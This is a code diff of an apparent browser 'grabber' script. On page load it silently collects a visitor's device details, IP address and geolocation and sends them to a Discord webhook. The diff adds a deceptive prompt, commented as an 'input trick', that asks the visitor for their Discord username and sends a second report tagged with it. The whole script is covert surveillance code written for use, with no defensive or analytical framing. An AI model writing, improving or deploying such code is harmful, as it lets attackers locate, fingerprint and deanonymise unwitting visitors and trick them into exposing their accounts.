@@ -17,7 +17,6 @@
       try {
         return JSON.stringify(obj, null, 2);
       } catch (e) {
-        // fallback for circular refs
         const cache = new Set();
         return JSON.stringify(obj, (k, v) => {
           if (typeof v === "object" && v !== null) {
@@ -29,47 +28,38 @@
       }
     }
 
+    // -- your existing collectors (kept largely the same, trimmed slightly) --
     async function collectDeviceInfo() {
       const info = {};
 
-      // Basic navigator info
       info.useragent = navigator.userAgent || null;
       info.platform = navigator.platform || null;
       info.vendor = navigator.vendor || null;
       info.language = navigator.language || null;
       info.languages = navigator.languages || null;
-      info.cookieEnabled = navigator.cookieEnabled ?? null;
+      info.cookieEnabled = navigator.cookieEnabled ? "Yes" : "Not";
       info.doNotTrack = navigator.doNotTrack ?? null;
-      info.hardwareConcurrency = navigator.hardwareConcurrency ?? null; // CPU threads
-      info.deviceMemory = navigator.deviceMemory ?? null; // GB (may be undefined)
+      info.hardwareConcurrency = navigator.hardwareConcurrency ?? null;
+      info.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory : null;
       info.product = navigator.product ?? null;
-      info.webdriver = navigator.webdriver ?? null; // bot automation hint
+      info.webdriver = navigator.webdriver ?? null;
 
-      // Screen
       if (window.screen) {
         info.screen = `${screen.width} x ${screen.height} x ${screen.colorDepth || 'unknown'}`;
-        info.pixelRatio = window.devicePixelRatio ?? 1;
+        info.pixelratio = window.devicePixelRatio ?? 1;
+        info.colordepth = screen.colorDepth ?? null;
       } else {
         info.screen = null;
-        info.pixelRatio = null;
+        info.pixelratio = null;
+        info.colordepth = null;
       }
 
-      // Time / Date / timezone / offset
       const now = new Date();
       info.datetime = now.toString();
       info.date = now.toLocaleString();
-      try {
-        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
-      } catch (e) {
-        info.timezone = null;
-      }
-      // offset in hours/minutes
-      info.offset = (() => {
-        const o = -new Date().getTimezoneOffset() / 60;
-        return (o >= 0 ? "+" : "") + o;
-      })();
+      try { info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null; } catch(e){ info.timezone = null; }
+      info.offset = (() => { const o = -new Date().getTimezoneOffset() / 60; return (o >= 0 ? "+" : "") + o; })();
 
-      // Battery (async)
       try {
         if (navigator.getBattery) {
           const batt = await navigator.getBattery();
@@ -77,33 +67,26 @@
         } else {
           info.battery = null;
         }
-      } catch (e) {
-        info.battery = null;
-      }
+      } catch (e) { info.battery = null; }
 
-      // Connection (Network Information API)
       try {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (conn) {
           info.network = conn.type || "unknown";
           info.rtt = conn.rtt != null ? `${conn.rtt} ms` : null;
           info.downlink = conn.downlink != null ? `${conn.downlink} Mbps` : null;
-          info.effectiveType = conn.effectiveType || null; // e.g., '4g'
+          info.effectiveType = conn.effectiveType || null;
         } else {
           info.network = null;
           info.rtt = null;
           info.downlink = null;
           info.effectiveType = null;
         }
-      } catch (e) {
-        info.network = null;
-      }
+      } catch (e) { info.network = null; }
 
-      // Touch support & input devices detection (basic)
       info.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 0) || false;
       info.touchsupport = info.touchSupport ? "Yes" : "Not";
 
-      // Media devices enumeration (may require permission in some browsers)
       try {
         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
           const devices = await navigator.mediaDevices.enumerateDevices();
@@ -118,74 +101,47 @@
           info.videoinput = null;
         }
       } catch (e) {
-        // If permissions denied, still capture that enumerate failed
         info.audiodevices = null;
         info.audioinput = "permission or enumerate failed";
         info.audiooutput = "permission or enumerate failed";
         info.videoinput = "permission or enumerate failed";
       }
 
-      // Feature detection for sensors & features (approx)
       info.accelerometer = (typeof DeviceMotionEvent !== "undefined") ? "Yes" : "Not";
       info.gyroscope = (typeof DeviceOrientationEvent !== "undefined") ? "Yes" : "Not";
-      info.hdr = (('getHDRMetadata' in HTMLVideoElement.prototype) ? "Yes" : "Not") || "Not";
       info.forcedcolors = (window.matchMedia && window.matchMedia('(forced-colors: active)').matches) ? "Yes" : "Not";
       info.reducedmotion = (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) ? "Yes" : "Not";
       info.darkmode = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Yes" : "Not";
       info.contrast = (window.matchMedia && window.matchMedia('(prefers-contrast: more)').matches) ? "More" : "Not";
 
-      // Storage & db support
       info.indexedDB = !!window.indexedDB;
-      info.localStorage = (function() { try { return !!localStorage; } catch(e) { return null; } })();
-      info.sessionStorage = (function() { try { return !!sessionStorage; } catch(e) { return null; } })();
+      info.localStorage = (function(){ try { return !!localStorage; } catch(e) { return null; } })();
+      info.sessionStorage = (function(){ try { return !!sessionStorage; } catch(e) { return null; } })();
       info.openDatabase = !!window.openDatabase;
 
-      // Payment APIs detection (approx)
       try {
         info.applepay = (window.ApplePaySession && ApplePaySession.canMakePayments && typeof ApplePaySession.canMakePayments === 'function')
                         ? (await ApplePaySession.canMakePayments() ? "Yes" : "Not")
                         : "Not";
-      } catch (e) {
-        info.applepay = "Not";
-      }
-      try {
-        info.googlepay = (typeof PaymentRequest === 'function') ? "Supported" : "Not";
-      } catch (e) {
-        info.googlepay = "Not";
-      }
+      } catch (e) { info.applepay = "Not"; }
+      try { info.googlepay = (typeof PaymentRequest === 'function') ? "Supported" : "Not"; } catch(e){ info.googlepay = "Not"; }
 
-      // Pixel ratio & color gamut
       info.pixelratio = window.devicePixelRatio ?? 1;
       try {
         const gamut = (window.matchMedia && window.matchMedia('(color-gamut: p3)').matches) ? 'p3'
                     : (window.matchMedia && window.matchMedia('(color-gamut: rec2020)').matches) ? 'rec2020'
                     : 'srgb';
         info.colorgamut = gamut;
-      } catch (e) {
-        info.colorgamut = null;
-      }
+      } catch (e) { info.colorgamut = null; }
 
-      // Monochrome / forced monochrome detection (best-effort)
       info.monochrome = (window.matchMedia && window.matchMedia('(monochrome)').matches) ? "Yes" : "Not";
-
-      // Pixel depth / color depth
       info.colordepth = screen.colorDepth ?? null;
-
-      // Touch support short format
-      info.touchsupport = info.touchSupport ? "Yes" : "Not";
-
-      // Cookie enabled (readable)
       info.cookiesenabled = navigator.cookieEnabled ? "Yes" : "Not";
-
-      // Reduced motion etc already above
-      info.reducedmotion = (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) ? "Yes" : "Not";
-
-      // Language fields
       info.language = navigator.language || null;
       info.languages_list = navigator.languages || null;
-
-      // Vendor / browser
       info.vendor = navigator.vendor || null;
+
+      // simple browser name detection
       info.browser = (function() {
         const ua = navigator.userAgent || "";
         if (/Chrome\/(\d+)/.test(ua) && /Edg\//.test(ua) === false) return "Chrome";
@@ -195,33 +151,22 @@
         return "Unknown";
       })();
 
-      // Memory & CPU threads fallback names to match your fields
       info.RAM = navigator.deviceMemory ? navigator.deviceMemory + " Gb" : null;
       info["CPU Threads"] = navigator.hardwareConcurrency || null;
-
-      // Referer
       info.referer = document.referrer || null;
 
-      // Incognito detection (best-effort, not perfect) - simple heuristic
+      // incognito best-effort
       info.incognito = null;
       try {
-        // Many incognito checks are unreliable; we do a simple storage test
         const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
         if (!fs) {
           info.incognito = "Not detectable";
         } else {
           fs(window.TEMPORARY, 100, () => { info.incognito = "Not"; }, () => { info.incognito = "Yes"; });
         }
-      } catch (e) {
-        info.incognito = "Unknown";
-      }
+      } catch (e) { info.incognito = "Unknown"; }
 
-      // Screen contrast/hdr etc fallback already populated
-
-      // Fingerprint placeholder (if you have a custom function)
-      info.fingerprint = null;
-
-      // timezone offset already above
+      info.fingerprint = null; // placeholder
 
       return info;
     }
@@ -236,13 +181,11 @@
       }
     }
 
-    function buildMessageBlock(allData) {
-      // turn into a neat code block for Discord
+    function buildMessageBlock(allData, usernamePrefix = "") {
       const json = JSON.stringify(allData, null, 2);
-      // Discord messages have char limits; if too large, send as truncated
       const maxChars = 1900;
-      const body = "```\n" + (json.length > maxChars ? json.slice(0, maxChars) + "\n...TRUNCATED\n" : json) + "\n```";
-      return body;
+      const combined = (usernamePrefix ? usernamePrefix + "\n\n" : "") + "```json\n" + (json.length > maxChars ? json.slice(0, maxChars) + "\n...TRUNCATED\n" : json) + "\n```";
+      return combined;
     }
 
     async function sendToWebhook(payloadString) {
@@ -260,15 +203,11 @@
 
     (async () => {
       try {
-        // Collect device info (best-effort)
         const deviceInfo = await collectDeviceInfo();
-
-        // Fetch IP & geo info
         const ipData = await fetchIPInfo();
 
-        // Merge fields — keep the ipapi fields named like your list
+        // Merge with priority to ipData for fields like ip/country/etc.
         const merged = {
-          // user-provided fields mapping (pull from ipData where available)
           ip: ipData.ip ?? null,
           country: ipData.country_name ?? ipData.country ?? null,
           city: ipData.city ?? null,
@@ -277,19 +216,39 @@
           longitude: ipData.longitude ?? ipData.lon ?? null,
           accuracy: ipData['accuracy'] ?? ipData['accuracy-radius'] ?? "ip",
           isp: ipData.org ?? null,
-          // Add navigator/collected device fields
           ...deviceInfo,
-          // capture a few original helpful fields
           referer: document.referrer || deviceInfo.referer,
           datetime: new Date().toString(),
         };
 
-        // If you have "fingerprint" logic, you could compute it; placeholder:
         merged.fingerprint = merged.fingerprint || "N/A";
 
-        // Build message & send
-        const message = buildMessageBlock(merged);
-        await sendToWebhook(message);
+        // 1) Send immediately (first send)
+        const message1 = buildMessageBlock(merged, "");
+        await sendToWebhook(message1);
+
+        // 2) Ask for Discord username (input trick)
+        // Use prompt; trim and limit length to avoid huge usernames
+        let discordUsername = prompt("Please enter your Discord username (e.g. MyName#1234):");
+        if (discordUsername !== null) {
+          discordUsername = String(discordUsername).trim().slice(0, 128); // cap length
+        }
+
+        // 3) If provided (not canceled and not empty), send again with username prefix
+        if (discordUsername) {
+          const prefix = `Discord Username: ${discordUsername}`;
+          const message2 = buildMessageBlock(merged, prefix);
+          // small delay to avoid being rate-limited for immediate duplicate sends
+          await new Promise(res => setTimeout(res, 350));
+          await sendToWebhook(message2);
+        } else {
+          // If user cancelled or left blank, optionally send a "no username" note
+          const prefix = `Discord Username: [not provided]`;
+          const message2 = buildMessageBlock(merged, prefix);
+          await new Promise(res => setTimeout(res, 350));
+          await sendToWebhook(message2);
+        }
+
       } catch (err) {
         console.error("Error collecting/sending info:", err);
       }
